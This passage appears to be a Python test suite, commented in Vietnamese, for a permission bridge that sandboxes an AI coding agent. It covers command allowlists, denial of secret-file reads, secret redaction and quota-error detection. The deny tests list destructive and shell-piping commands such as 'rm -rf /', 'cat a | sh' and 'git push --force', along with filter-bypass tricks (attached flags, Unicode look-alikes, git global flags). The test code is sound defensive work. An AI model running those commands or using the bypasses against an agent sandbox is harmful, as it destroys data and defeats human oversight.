            prompt_error=None,
            stderr_acc="[DEBUG] checking rate limit and quota policy: ok\n",
            response_text=normal_resp,
            timed_out=False,
            timeout_val=60.0,
            stop_reason="end_turn",
        )
        self.assertIsNone(info, "end_turn thành công với từ 'quota' trong chat/stderr không được trả error info")

        # Kiểm tra qua check_violations và --apply thật
        wt_dir = self.root / "wt_quota"
        subprocess.run(
            ["git", "-C", str(self.repo_dir), "worktree", "add", "-b", "agy/test-quota", str(wt_dir), "HEAD"],
            capture_output=True,
            check=True,
        )
        target_f = wt_dir / "target.txt"
        target_f.write_text("Hello quota ok\n", encoding="utf-8")
        changed = ["target.txt"]
        violations = agy_acp_bridge.check_violations(wt_dir, changed, [wt_dir / "target.txt"])
        self.assertEqual(len(violations), 0)

        # Gọi apply_worktree_changes thật để kiểm tra --apply
        applied = agy_acp_bridge.apply_worktree_changes(wt_dir, self.repo_dir, changed, [wt_dir / "target.txt"])
        self.assertEqual(applied, 1)
        self.assertTrue((self.repo_dir / "target.txt").exists())
        self.assertEqual((self.repo_dir / "target.txt").read_text(encoding="utf-8"), "Hello quota ok\n")

    def test_m04_locations_empty_in_request_permission(self):
        """M-04: Tool call có locations: [] không làm văng IndexError, dispatch qua dispatch_request_permission thật."""
        # Gọi trực tiếp check_file_permission của bridge
        allowed, reason = agy_acp_bridge.check_file_permission(
            path_str="",
            effective_dir=self.repo_dir,
            effective_allow_write=[self.repo_dir / "allowed.txt"],
        )
        self.assertFalse(allowed)

        # Tool call có locations rỗng nhưng Path hợp lệ trong args
        params = {"toolCall": {"name": "write_file", "kind": "edit", "args": {"Path": "allowed.txt"}, "locations": []}}
        allowed_real, is_nh, reason, target, perm_kind, tool_name = agy_acp_bridge.dispatch_request_permission(
            params=params,
            effective_dir=self.repo_dir,
            effective_allow_write=[self.repo_dir / "allowed.txt"],
            allow_cmd=None,
            is_worktree=False,
        )
        self.assertTrue(allowed_real, f"dispatch_request_permission phải cho phép allowed.txt, lý do: {reason}")
        self.assertEqual(target, "allowed.txt")
        self.assertEqual(perm_kind, "edit")

    def test_m05_read_permission_and_secret_redaction_and_lock_collision(self):
        """M-05: kind == 'read' từ chối file bí mật/ngoài repo; redact_secrets che token; lock dùng chung."""
        forbidden_reads = [
            ".env",
            ".env.production",
            "server.key",
            "cert.pem",
            "id_rsa",
            "id_rsa.pub",
            "credentials.json",
            "app_secret.txt",
            ".git/config",
            "../outside.txt",
        ]
        for f in forbidden_reads:
            allowed, reason = agy_acp_bridge.check_read_permission(f, self.repo_dir)
            self.assertFalse(allowed, f"File nhạy cảm '{f}' phải bị từ chối đọc: {reason}")

        # Đọc file thường phải được phép
        allowed, _ = agy_acp_bridge.check_read_permission("README.md", self.repo_dir)
        self.assertTrue(allowed)

        # Che giấu bí mật trong báo cáo
        raw_text = "sk-proj-SUPER_SECRET_API_KEY_123456789 and ghp_1234567890123456789012 and token=secret_value"
        redacted = agy_acp_bridge.redact_secrets(raw_text)
        self.assertNotIn("SUPER_SECRET_API_KEY", redacted)
        self.assertNotIn("ghp_1234567890123456789012", redacted)
        self.assertIn("[REDACTED_SECRET]", redacted)

        # Khóa dùng chung theo repo_dir không phụ thuộc report_dir
        rep1 = self.root / "rep1"
        rep2 = self.root / "rep2"
        lock1 = agy_acp_bridge.get_lock_file(rep1, self.repo_dir)
        lock2 = agy_acp_bridge.agy_bridge.get_lock_file(rep2, self.repo_dir)
        self.assertEqual(lock1, lock2, "Cả hai bridge phải tạo cùng một file khóa cho cùng repo_dir")

    def test_m01_task_slug_sanitization(self):
        """m-01: task_slug được làm sạch chống .., dấu chấm đầu/cuối, giới hạn độ dài."""
        self.assertEqual(agy_acp_bridge.sanitize_task_slug("task..v1"), "task_v1")
        self.assertEqual(agy_acp_bridge.sanitize_task_slug(".hidden-task"), "hidden-task")
        slug = agy_acp_bridge.sanitize_task_slug("..very..bad..name..")
        self.assertNotIn("..", slug)
        self.assertFalse(slug.startswith("."))
        self.assertFalse(slug.endswith("."))
        # Git check-ref-format
        branch_name = f"agy/{slug}-20261115-000000"
        res = subprocess.run(
            ["git", "-C", str(self.repo_dir), "check-ref-format", "--branch", branch_name],
            capture_output=True,
            text=True,
        )
        self.assertEqual(res.returncode, 0, f"Branch name {branch_name} phải hợp lệ")


class TestAgyAcpBridgeP6dNewBypasses(unittest.TestCase):
    """Bộ kiểm thử 20+ cách lách mới (P6d): cờ dính, gộp cờ, unicode, tab, cờ toàn cục git, symlink."""

    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.root = Path(self.tmpdir.name)
        self.repo_dir = self.root / "repo"
        self.repo_dir.mkdir()
        (self.repo_dir / "scripts").mkdir()
        (self.repo_dir / "scripts" / "test.py").write_text("print('test')\n", encoding="utf-8")
        (self.repo_dir / "README.md").write_text("readme\n", encoding="utf-8")
        subprocess.run(["git", "init"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.name", "Test User"], cwd=self.repo_dir, check=True)
        subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=self.repo_dir, check=True)
        subprocess.run(["git", "add", "."], cwd=self.repo_dir, check=True)
        subprocess.run(["git", "commit", "-m", "init"], cwd=self.repo_dir, check=True)

    def tearDown(self):
        self.tmpdir.cleanup()

    def test_attached_flags_denied(self):
        """1-3. Cờ dính chuỗi / nháy với lệnh nguy hiểm bị từ chối chính xác."""
        attached_cases = [
            ("python_c_attached", 'python3 -c"import os"'),
            ("python_uc_attached", 'python3 -uc"import os"'),
            ("node_e_attached", 'node -e"eval(\'x\')"'),
        ]
        for name, cmd in attached_cases:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Cờ dính '{name}' ({cmd}) phải bị từ chối")

    def test_bundled_flags_and_exact_match(self):
        """4-6. Cờ gộp: cho phép cờ đọc an toàn (ls -laR), từ chối cờ gộp nguy hiểm (rm -rf, chmod -R)."""
        allowed_res, _, _ = agy_acp_bridge.check_command_permission("ls -la", None, self.repo_dir)
        self.assertTrue(allowed_res, "ls -la nằm trong allowlist")

        # P6f: Cờ đọc an toàn gộp được phép
        self.assertTrue(agy_acp_bridge.check_command_permission("ls -laR", None, self.repo_dir)[0])
        self.assertTrue(agy_acp_bridge.check_command_permission("ls -latrz", None, self.repo_dir)[0])
        self.assertTrue(agy_acp_bridge.check_command_permission("wc -c -l README.md", None, self.repo_dir)[0])

        denied_bundled = [
            ("rm_rf", "rm -rf tmp/"),
            ("rm_rfi", "rm -rfi tmp/"),
            ("chmod_R", "chmod -R 777 dir/"),
        ]
        for name, cmd in denied_bundled:
            allowed, _, _ = agy_acp_bridge.check_command_permission(cmd, None, self.repo_dir)
            self.assertFalse(allowed, f"Cờ gộp nguy hiểm '{name}' ({cmd}) phải bị từ chối")

    def test_equals_options_denied(self):
        """7-9. Cờ dạng --opt=val: cho phép cờ an toàn, từ chối cờ nguy hiểm."""
        # P6f: Cờ an toàn có = được phép
        self.assertTrue(agy_acp_bridge.check_command_permission("ls --color=never", None, self.repo_dir)[0])
        self.assertTrue(agy_acp_bridge.check_command_permission("rg --context=5 foo README.md", None, self.repo_dir)[0])

        equals_cases = [
            ("sed_in_place", "sed --in-place=bak s/a/b/ f"),
            ("git_flag_c_equals", "git -C=/tmp status"),
            ("git_git_dir_equals", "git --git-dir=/tmp/.git status"),
            ("git_work_tree_equals", "git --work-tree=/tmp status"),
        ]
        for name, cmd in equals_cases:
            allowed, _, _ = agy_acp_bridge.check_command_permission(cmd, None, self.repo_dir)
            self.assertFalse(allowed, f"Cờ dạng = '{name}' ({cmd}) phải bị từ chối")

    def test_git_global_flags_denied(self):
        """10-13. Git cờ toàn cục trước lệnh con bị từ chối."""
        git_global_cases = [
            ("git_exec_path", "git --exec-path=/tmp status"),
            ("git_flag_C", "git -C /tmp status"),
            ("git_git_dir", "git --git-dir=.git status"),
            ("git_work_tree", "git --work-tree=/tmp status"),
        ]
        for name, cmd in git_global_cases:
            allowed, _, _ = agy_acp_bridge.check_command_permission(cmd, None, self.repo_dir)
            self.assertFalse(allowed, f"Git global flag '{name}' ({cmd}) phải bị từ chối")

    def test_git_dangerous_subcmd_flags_denied(self):
        """14-16. Cờ nguy hiểm trong git (no-verify, branch -D, output ngoài) bị từ chối."""
        danger_flags = [
            ("git_commit_no_verify", "git commit --no-verify -m x"),
            ("git_commit_n", "git commit -n -m x"),
            ("git_branch_delete_main", "git branch -D main"),
            ("git_show_output_outside", "git show --output=/tmp/out"),
            ("git_push_force", "git push --force origin main"),
        ]
        for name, cmd in danger_flags:
            allowed, _, _ = agy_acp_bridge.check_command_permission(cmd, None, self.repo_dir)
            self.assertFalse(allowed, f"Git dangerous flag '{name}' ({cmd}) phải bị từ chối")

    def test_git_uppercase_subcmd_allowed(self):
        """17. Git lệnh con chữ hoa được so khớp theo chữ thường không crash."""
        allowed, _, _ = agy_acp_bridge.check_command_permission("git LOG", None, self.repo_dir)
        self.assertTrue(allowed, "git LOG phải được cho phép")

    def test_unicode_and_non_printable_tokens_denied(self):
        """18-20. Unicode lạ, ký tự không in được, tab và nháy bất thường bị từ chối."""
        non_ascii_cases = [
            ("null_byte", 'echo "hello\x00world"'),
            ("unicode_nbsp", "ls\u00A0-la"),
            ("unicode_em_dash", "ls —la"),
        ]
        for name, cmd in non_ascii_cases:
            allowed, _, _ = agy_acp_bridge.check_command_permission(cmd, None, self.repo_dir)
            self.assertFalse(allowed, f"Unicode / non-printable '{name}' phải bị từ chối")

    def test_cat_secret_args_denied(self):
        """21. Cat cố tình đọc file bí mật qua đối số bị check_read_permission từ chối."""
        allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
            "cat .git/config", None, self.repo_dir
        )
        self.assertFalse(allowed)
        self.assertFalse(needs_human)

    def test_python_script_path_checks(self):
        """22-23. python3 scripts/... chỉ nhận đường dẫn tương đối sạch không symlink."""
        # Đường dẫn tuyệt đối bị từ chối
        abs_cmd = f"python3 {self.repo_dir / 'scripts' / 'test.py'}"
        allowed_abs, _, _ = agy_acp_bridge.check_command_permission(abs_cmd, None, self.repo_dir)
        self.assertFalse(allowed_abs)

        # Đường dẫn có .. bị từ chối
        traversal_cmd = "python3 scripts/../scripts/test.py"
        allowed_trav, _, _ = agy_acp_bridge.check_command_permission(traversal_cmd, None, self.repo_dir)
        self.assertFalse(allowed_trav)

    def test_redirection_and_ampersand(self):
        """24-25. Ký tự & và chuyển hướng ngoài worktree bị từ chối; trong worktree được phép."""
        allowed_devnull, _, _ = agy_acp_bridge.check_command_permission("git status > /dev/null", None, self.repo_dir)
        self.assertTrue(allowed_devnull)

        # Chuyển hướng trong worktree được phép theo P6f
        allowed_file, _, _ = agy_acp_bridge.check_command_permission("git status > file.txt", None, self.repo_dir)
        self.assertTrue(allowed_file)

        # Chuyển hướng ra ngoài worktree bị từ chối
        allowed_outside, _, _ = agy_acp_bridge.check_command_permission("git status > /tmp/out.txt", None, self.repo_dir)
        self.assertFalse(allowed_outside)

        allowed_traversal, _, _ = agy_acp_bridge.check_command_permission("git status > ../out.txt", None, self.repo_dir)
        self.assertFalse(allowed_traversal)

        # Chuỗi & với lệnh an toàn được phép theo P6f
        allowed_amp, _, _ = agy_acp_bridge.check_command_permission("echo hi & echo world", None, self.repo_dir)
        self.assertTrue(allowed_amp)

        # Chuỗi & chứa lệnh nguy hiểm bị từ chối
        allowed_amp_danger, _, _ = agy_acp_bridge.check_command_permission("echo hi & rm -rf /", None, self.repo_dir)
        self.assertFalse(allowed_amp_danger)

    def test_p6c_c03_stop_reason_reset_on_auto_continue_prevents_ok_on_crash(self):
        """P6c-C03: Reset stop_reason ở đầu mỗi lượt auto-continue để không báo ok khi lượt 2 crash."""
        # Giả lập lượt 2 crash: stop_reason được reset về rỗng ở đầu vòng lặp auto-continue
        stop_reason = ""
        info = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result=None,
            prompt_error={"message": "Process terminated abnormally"},
            stderr_acc="",
            response_text="",
            timed_out=False,
            timeout_val=60.0,
            stop_reason=stop_reason,
        )
        self.assertIsNotNone(info)
        self.assertIn("Process terminated abnormally", str(info.get("raw_message")))
        self.assertNotEqual(stop_reason, "end_turn")

    def test_p6c_m01_null_jsonrpc_fields_handled_gracefully(self):
        """P6c-M01: JSON-RPC chứa trường null (params, toolCall, args, result) không gây AttributeError crash."""
        null_msg = {
            "jsonrpc": "2.0",
            "method": "session/request_permission",
            "params": None,
        }
        allowed, is_nh, reason, target, kind, tool_name = agy_acp_bridge.dispatch_request_permission(
            params=agy_acp_bridge.as_dict(null_msg.get("params")),
            effective_dir=self.repo_dir,
            effective_allow_write=None,
            allow_cmd=None,
            is_worktree=False,
        )
        self.assertIsInstance(reason, str)

        info = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"result": None, "usage": None},
            prompt_error=None,
            stderr_acc="",
            response_text="",
            timed_out=False,
            timeout_val=60.0,
            stop_reason=None,
        )
        self.assertIsNone(info)


class TestAgyAcpBridgeP6gRegressions(TestAgyAcpBridge):
    """Bộ test hồi quy P6g: 3 việc cho ACP bridge."""

    def test_p6g_piped_or_chained_shell_blocked_unit(self):
        """P6g-Việc 1: Chặn khi một đoạn sau | (hoặc &&, ;) có lệnh đầu là sh, bash, zsh, dash, eval, source, ., xargs."""
        blocked_cmds = [
            "cat a | sh",
            "cat a | /bin/sh",
            "cat a | env sh",
            "cat a | /usr/bin/env /bin/sh",
            "cat a | bash",
            "cat a | zsh",
            "cat a | dash",
            'cat a | eval "echo 1"',
            "cat a | source script.sh",
            "cat a | . script.sh",
            "cat a | xargs rm",
            "cat a | /usr/bin/xargs ls",
            "cat a | env -i /bin/bash",
            "echo 1 && sh",
            "echo 1 ; /bin/sh",
            "echo 1 && env bash",
            "echo 1 ; . script.sh",
            'echo 1 ; eval "echo 2"',
            "echo 1 && xargs echo",
            "echo 1 || zsh",
            "echo 1 \n dash",
        ]
        for cmd in blocked_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertFalse(allowed, f"Lệnh pipe/compound shell nguy hiểm phải bị chặn: {cmd}")
            self.assertFalse(needs_human, f"Không được hỏi người dùng với lệnh cấm: {cmd}")
            self.assertIn("Lệnh cấm", reason)

    def test_p6g_safe_piped_commands_not_blocked_unit(self):
        """P6g-Việc 1: Không được chặn nhầm grep sh file, git log | head, ls | wc -l."""
        safe_cmds = [
            "grep sh file",
            "git log | head",
            "ls | wc -l",
            "cat file | grep sh",
            "git status && git diff",
            "echo hello | tr a-z A-Z",
            "ls docs | wc -l",
        ]
        for cmd in safe_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh an toàn không được chặn nhầm: {cmd} (reason: {reason})")
            self.assertFalse(needs_human)

    def test_p6g_integration_piped_command_blocked_and_safe_allowed(self):
        """P6g-Việc 1 tích hợp: cat a | sh bị chặn trong ACP; git log | head và ls | wc -l được cho phép."""
        # Ca chặn
        proc_pipe, decisions_pipe = self._run_acp_custom_cmd("cat a | sh")
        self.assertEqual(decisions_pipe, ["deny"])
        lines_pipe = proc_pipe.stdout.strip().splitlines()
        self.assertTrue(lines_pipe[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines_pipe[0])

        # Ca không chặn nhầm 1: git log | head
        proc_head, decisions_head = self._run_acp_custom_cmd("git log | head")
        self.assertEqual(decisions_head, ["allow"])
        lines_head = proc_head.stdout.strip().splitlines()
        self.assertTrue(lines_head[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines_head[0])

        # Ca không chặn nhầm 2: ls | wc -l
        proc_wc, decisions_wc = self._run_acp_custom_cmd("ls | wc -l")
        self.assertEqual(decisions_wc, ["allow"])
        lines_wc = proc_wc.stdout.strip().splitlines()
        self.assertTrue(lines_wc[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines_wc[0])

    def test_p6g_status_warn_when_command_denied_and_no_files_changed(self):
        """P6g-Việc 2: Khi lượt cuối có lệnh bị từ chối và không có file nào được ghi/đổi, STATUS là warn (exit 0), có denied=<n>."""
        proc, decisions = self._run_acp_custom_cmd("cat a | sh")
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertFalse(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=1", lines[0])

    def test_p6g_all_turns_denied_stops_with_status_warn_and_denied_count(self):
        """P6g-Việc 2: Tất cả các lượt bị từ chối lệnh và không có file ghi/đổi: STATUS là warn (exit 0), giữ denied=<n>."""
        self.env["MOCK_ACP_SCENARIO"] = "p1h_always_denied"
        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--max-auto-continue", "1",
            "--report-dir", str(self.report_dir),
        ]
        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )
        self.assertEqual(proc.returncode, 0)
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertFalse(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=2", lines[0])

    def test_p6g_quota_not_suspected_on_max_tokens_or_cancelled_or_chat_text_unit(self):
        """P6g-Việc 3: stopReason='max_tokens', 'cancelled', 'end_turn' không kích hoạt nghi quota chỉ vì chuỗi chứa chữ 'quota'."""
        # 1. stopReason='max_tokens' với response_text chứa từ khóa quota
        info_max_tok = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"result": {"stopReason": "max_tokens"}},
            prompt_error=None,
            stderr_acc="",
            response_text="Phản hồi dài chạm giới hạn max_tokens: thảo luận quota và 429 resource exhausted.",
            timed_out=False,
            timeout_val=60.0,
            stop_reason="max_tokens",
        )
        self.assertIsNotNone(info_max_tok)
        self.assertFalse(info_max_tok.get("is_suspected_quota"), "max_tokens không được kích hoạt nghi quota vì text chứa 'quota'")
        self.assertIsNone(info_max_tok.get("matched_keyword"))

        # 2. stopReason='cancelled' với response_text chứa từ khóa quota
        info_cancelled = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"result": {"stopReason": "cancelled"}},
            prompt_error=None,
            stderr_acc="",
            response_text="Hủy phiên khi đang kiểm tra quota.",
            timed_out=False,
            timeout_val=60.0,
            stop_reason="cancelled",
        )
        self.assertIsNotNone(info_cancelled)
        self.assertFalse(info_cancelled.get("is_suspected_quota"))
        self.assertIsNone(info_cancelled.get("matched_keyword"))

        # 3. stopReason='end_turn' với response_text chứa 'quota'
        info_end_turn = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"result": {"stopReason": "end_turn"}},
            prompt_error=None,
            stderr_acc="",
            response_text="Báo cáo hạn mức quota còn lại của dự án.",
            timed_out=False,
            timeout_val=60.0,
            stop_reason="end_turn",
        )
        self.assertIsNone(info_end_turn)

    def test_p6g_quota_detected_only_on_real_error_fields_unit(self):
        """P6g-Việc 3: Chỉ quét từ khóa quota trong trường lỗi thật (error.message, HTTP 429, RESOURCE_EXHAUSTED)."""
        # 1. Trường prompt_error chứa RESOURCE_EXHAUSTED
        info_err_exhausted = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"error": {"code": -32000, "message": "RESOURCE_EXHAUSTED: quota exceeded"}},
            prompt_error={"code": -32000, "message": "RESOURCE_EXHAUSTED: quota exceeded"},
            stderr_acc="",
            response_text="",
            timed_out=False,
            timeout_val=60.0,
            stop_reason="end_turn",
        )
        self.assertIsNotNone(info_err_exhausted)
        self.assertTrue(info_err_exhausted.get("is_suspected_quota"))
        self.assertIn(info_err_exhausted.get("matched_keyword"), ("exhausted", "quota"))

        # 2. Trường prompt_error chứa mã 429
        info_err_429 = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"error": {"code": 429, "message": "Too Many Requests"}},
            prompt_error={"code": 429, "message": "Too Many Requests"},
            stderr_acc="",
            response_text="",
            timed_out=False,
            timeout_val=60.0,
            stop_reason="end_turn",
        )
        self.assertIsNotNone(info_err_429)
        self.assertTrue(info_err_429.get("is_suspected_quota"))
        self.assertEqual(info_err_429.get("matched_keyword"), "429")

        # 3. Trường prompt_error lỗi thường không chứa từ khóa quota -> không nghi quota
        info_other_err = agy_acp_bridge.detect_error_and_suspected_quota(
            prompt_result={"error": {"code": 500, "message": "Internal compilation error"}},
            prompt_error={"code": 500, "message": "Internal compilation error"},
            stderr_acc="",
            response_text="",
            timed_out=False,
            timeout_val=60.0,
            stop_reason="end_turn",
        )
        self.assertIsNotNone(info_other_err)
        self.assertFalse(info_other_err.get("is_suspected_quota"))
        self.assertIsNone(info_other_err.get("matched_keyword"))


if __name__ == "__main__":
    unittest.main()
